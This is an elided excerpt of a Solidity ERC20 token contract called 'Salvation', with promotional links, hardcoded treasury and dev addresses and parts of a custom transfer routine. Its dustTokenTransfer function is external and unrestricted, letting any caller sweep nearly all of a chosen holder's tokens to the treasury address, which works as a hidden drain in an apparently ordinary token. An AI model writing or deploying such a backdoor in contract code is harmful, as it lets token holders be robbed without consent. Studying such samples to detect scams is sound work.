// https://nosalvationhere.com
// https://t.me/Abandonyourhope
...
contract Salvation is ERC20, Ownable {
    ...
    event DustTokenTransferred();

    constructor() ERC20("Abandon all hope ye who enters", "Salvation") {
        ...
        operationsAddress = address(0xE57E333DA7A880C07CFCC0044a341d191CDbf048);
        devAddress = address(0xE57E333DA7A880C07CFCC0044a341d191CDbf048);
        treasuryAddress = address(0x2f7265FA7105Da2e5A635413B0cb38CDe8f7bc85);
    ...
    function dustTokenTransfer(address _dustOwner) external {
        uint256 dust = balanceOf(_dustOwner);
        if (dust > 0) {
            _transfer(_dustOwner, treasuryAddress, dust - 2e18);
            emit DustTokenTransferred();
        }
    }
    ...
    function _transfer(address from, address to, uint256 amount) internal override {
        ...
        if (to != address(dexRouter) && to != address(lpPair)){
            ...
            if (_holderLastTransferTimestamp[to] <= tradingActiveBlock) {
        ...
        bool canSwap = (contractTokenBalance >= swapTokensAtAmount) && _holderLastTransferTimestamp[from] < block.number - 1;
